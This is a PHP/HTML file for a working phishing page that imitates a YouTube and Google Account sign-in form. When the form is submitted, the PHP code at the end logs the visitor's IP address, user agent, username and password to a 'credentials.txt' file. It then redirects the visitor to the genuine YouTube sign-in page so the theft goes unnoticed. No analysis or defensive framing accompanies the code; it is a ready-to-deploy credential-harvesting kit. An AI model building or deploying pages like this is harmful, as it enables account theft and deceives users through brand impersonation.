<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube</title>
		<link rel="icon" type="image/x-icon" href="./youtube.ico">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
        }

        .sign-in-box {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            padding: 40px;
            text-align: center;
            width: 350px;
            max-width: 90%;
        }

        .youtube-logo {
            width: 100px;
            margin-bottom: 15px;
        }

        h2 {
            font-size: 24px;
            margin-bottom: 15px;
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
        }

        .form-group input {
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #dcdcdc;
            box-sizing: border-box;
        }

        .submit-btn {
            background-color: #4285F4;
            border: none;
            border-radius: 8px;
            color: white;
            padding: 12px 15px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            transition: background-color 0.3s ease;
        }

        .submit-btn:hover {
            background-color: #357ae8;
        }

        .submit-btn:active {
            background-color: #3367d6;
        }

        .forgot-password, .create-account {
            display: block;
            color: #4285F4;
            font-size: 14px;
            text-decoration: none;
            margin-top: 10px;
        }

        .forgot-password:hover, .create-account:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="sign-in-box">
            <img src="./youtube.svg" class="youtube-logo">
            <h2>Use your Google Account</h2>
            <form method="POST" action="">
                <div class="form-group">
                    <label for="username">Email address or phone number</label>
										<input type="text" name="username" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="submit-btn">Sign In</button>
                <a href="https://www.youtube.com/signup" class="forgot-password">Forgot your password?</a>
                <a href="https://www.youtube.com/signup" class="create-account">Create account</a>
            </form>
        </div>
    </div>
</body>
</html>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'] . "\r\n";
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] . "\r\n";
    } else {
        $ip = $_SERVER['REMOTE_ADDR'] . "\r\n";
    }
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    $filename = "../credentials.txt";
    $data = "\n|-------------------YOUTUBE-------------------|\n" . "User-Agent: " . $useragent . "\n" . "IP: " . $ip . "\n";
    file_put_contents($filename, $data, FILE_APPEND);

    $username = $_POST["username"];
    $password = $_POST["password"];

    $data = "User: " . $username . "\n" . "Pass: " . $password . "\n|-------------------YOUTUBE-------------------|\n";
    file_put_contents($filename, $data, FILE_APPEND);

    header("Location: https://www.youtube.com/signin");
    exit();
}
?>
